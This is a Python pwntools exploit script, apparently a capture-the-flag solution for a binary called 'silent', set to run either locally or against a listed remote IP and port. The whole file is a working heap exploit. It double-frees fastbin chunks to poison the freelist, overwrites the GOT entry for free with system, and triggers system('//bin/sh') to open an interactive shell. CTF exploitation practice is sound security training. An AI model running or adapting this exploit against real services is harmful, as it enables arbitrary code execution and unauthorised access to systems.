#! /usr/bin/env python
# -*- coding: utf-8 -*-
#
# Copyright © 2018 hzshang <hzshang15@gmail.com>

from pwn import *
context.log_level="debug"
pwn_file="./silent"
elf=ELF(pwn_file)

if len(sys.argv)==1:
    conn=process(pwn_file)
    pid=conn.pid
else:
    conn=remote("39.107.32.132",10000)
    pid=0

def debug():
    log.debug("process pid:%d"%pid)
    pause()

def add(size,content):
    conn.sendline("1")
    conn.send("\n")
    conn.send(str(size))
    conn.send(content)
    conn.send("\n")

def edit(index,content,junk):
    conn.sendline("3")
    conn.send("\n")
    conn.sendline(str(index))
    conn.send(content)
    sleep(0.1)
    conn.send(junk)

def dele(index):
    conn.sendline("2")
    conn.send("\n")
    conn.send(str(index))
    conn.send("\n")

conn.recv()
add(0x60,"a")#1
add(0x60,"a")#2
add(0x60,"a")#3
dele(0)
dele(1)
dele(0)
add(0x60,"a")
edit(0,p64(0x60209d),"1\n")
add(0x60,"a")
add(0x60,"a")
add(0x60,"//bin/sh")
add(0x60,"a"*0x14+p64(elf.got["free"])+p64(0))
edit(0,p64(elf.symbols["system"]),"")
conn.sendline("2")
conn.sendline("3")
conn.send("h")

conn.interactive()
